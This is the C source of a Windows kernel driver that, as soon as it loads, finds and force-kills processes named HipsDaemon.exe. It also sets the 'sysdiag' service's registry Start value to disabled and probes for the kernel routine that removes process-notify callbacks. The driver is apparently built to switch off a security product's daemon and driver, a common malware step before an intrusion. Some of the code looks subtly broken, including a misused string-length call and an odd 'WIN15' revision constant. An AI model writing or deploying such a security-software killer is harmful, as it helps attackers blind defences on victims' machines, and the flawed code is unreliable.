#include <ntddk.h>

#define TARGET_WIN10_BUILD     19045
#define TARGET_WIN15_REVISION   7184

typedef struct _EPROCESS EPROCESS;

#define EPROCESS_UNIQUE_PROCESS_ID      0x2E0
#define EPROCESS_ACTIVE_PROCESS_LINKS   0x2F0

NTKERNELAPI PLIST_ENTRY PsGetProcessList(VOID);
NTKERNELAPI UCHAR* PsGetProcessImageFileName(PEPROCESS Process);
NTKERNELAPI NTSTATUS PsTerminateProcess(PEPROCESS Process, NTSTATUS ExitStatus);

VOID DriverUnload(_In_ PDRIVER_OBJECT DriverObject)
{
    UNREFERENCED_PARAMETER(DriverObject);
    DbgPrint("MiniDrv: Unload\r\n");
}

NTSTATUS ForceKillProcessByPid(HANDLE pid)
{
    NTSTATUS status;
    PEPROCESS pEprocess = NULL;

    status = PsLookupProcessByProcessId(pid, &pEprocess);
    if (!NT_SUCCESS(status))
    {
        DbgPrint("MiniDrv: PsLookupProcessByProcessId failed, PID=%lu, status=%08X\r\n",
            HandleToUlong(pid), status);
        return status;
    }

    status = PsTerminateProcess(pEprocess, STATUS_SUCCESS);
    DbgPrint("MiniDrv: PsTerminateProcess PID=%lu, status=%08X\r\n",
        HandleToUlong(pid), status);

    ObDereferenceObject(pEprocess);
    return status;
}

VOID EnumAndKillHipsDaemon()
{
    PLIST_ENTRY pListHead = NULL;
    PLIST_ENTRY pCurEntry = NULL;
    PEPROCESS pEproc = NULL;
    HANDLE pid = NULL;
    UCHAR imageName[16] = { 0 };
    ANSI_STRING targetName = { 0 };
    ANSI_STRING currentName = { 0 };
    UCHAR* pImgName = NULL;
    SIZE_T copyLength = 0;

    RtlInitAnsiString(&targetName, "HipsDaemon.exe");

    pListHead = PsGetProcessList();
    if (pListHead == NULL)
    {
        DbgPrint("MiniDrv: PsGetProcessList returned NULL\r\n");
        return;
    }

    pCurEntry = pListHead->Flink;

    while (pCurEntry != NULL && pCurEntry != pListHead)
    {
        pEproc = CONTAINING_RECORD(pCurEntry, EPROCESS, ActiveProcessLinks);
        pCurEntry = pCurEntry->Flink;

        pid = *(HANDLE*)((PUCHAR)pEproc + EPROCESS_UNIQUE_PROCESS_ID);
        pImgName = PsGetProcessImageFileName(pEproc);

        if (pImgName != NULL)
        {
            RtlZeroMemory(imageName, sizeof(imageName));
            copyLength = RtlStringCbLengthA((PCSTR)pImgName, sizeof(imageName));
            if (copyLength < sizeof(imageName))
            {
                RtlCopyMemory(imageName, pImgName, copyLength);
                imageName[copyLength] = '\0';
            }
            else
            {
                RtlCopyMemory(imageName, pImgName, sizeof(imageName) - 1);
                imageName[sizeof(imageName) - 1] = '\0';
            }

            RtlInitAnsiString(&currentName, (PCSTR)imageName);
            if (RtlCompareAnsiString(&currentName, &targetName, TRUE) == 0)
            {
                DbgPrint("MiniDrv: Found HipsDaemon.exe, PID=%lu\r\n", HandleToUlong(pid));
                ForceKillProcessByPid(pid);
            }
        }
    }
}

NTSTATUS DisableSysdiagService()
{
    NTSTATUS status = STATUS_SUCCESS;
    OBJECT_ATTRIBUTES objAttr = { 0 };
    UNICODE_STRING keyPath = { 0 };
    UNICODE_STRING valueName = { 0 };
    HANDLE hKey = NULL;
    ULONG startValue = 4; // SERVICE_DISABLED

    RtlInitUnicodeString(&keyPath, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\sysdiag");
    InitializeObjectAttributes(&objAttr, &keyPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

    status = ZwOpenKey(&hKey, KEY_WRITE, &objAttr);
    if (!NT_SUCCESS(status))
    {
        DbgPrint("MiniDrv: ZwOpenKey sysdiag failed, status=%08X\r\n", status);
        return status;
    }

    RtlInitUnicodeString(&valueName, L"Start");
    status = ZwSetValueKey(hKey, &valueName, 0, REG_DWORD, &startValue, sizeof(ULONG));
    if (NT_SUCCESS(status))
    {
        DbgPrint("MiniDrv: Set sysdiag Start=4 success\r\n");
    }
    else
    {
        DbgPrint("MiniDrv: ZwSetValueKey Start failed, status=%08X\r\n", status);
    }

    ZwClose(hKey);
    return status;
}

VOID TryRemoveSysdiagCallbackStub()
{
    UNICODE_STRING routineName = { 0 };
    PVOID pFunc = NULL;

    RtlInitUnicodeString(&routineName, L"PsRemoveProcessNotifyRoutine");
    pFunc = MmGetSystemRoutineAddress(&routineName);

    if (pFunc != NULL)
    {
        DbgPrint("MiniDrv: PsRemoveProcessNotifyRoutine found at %p\r\n", pFunc);
    }
    else
    {
        DbgPrint("MiniDrv: PsRemoveProcessNotifyRoutine NOT FOUND\r\n");
    }
}

NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(RegistryPath);
    NTSTATUS status = STATUS_SUCCESS;

    DriverObject->DriverUnload = DriverUnload;

    DbgPrint("==== MiniDrv Loaded: Windows 10 %u.%u ====\r\n", TARGET_WIN10_BUILD, TARGET_WIN15_REVISION);

    EnumAndKillHipsDaemon();
    TryRemoveSysdiagCallbackStub();
    DisableSysdiagService();

    DbgPrint("==== MiniDrv Work Done ====\r\n");

    return status;
}
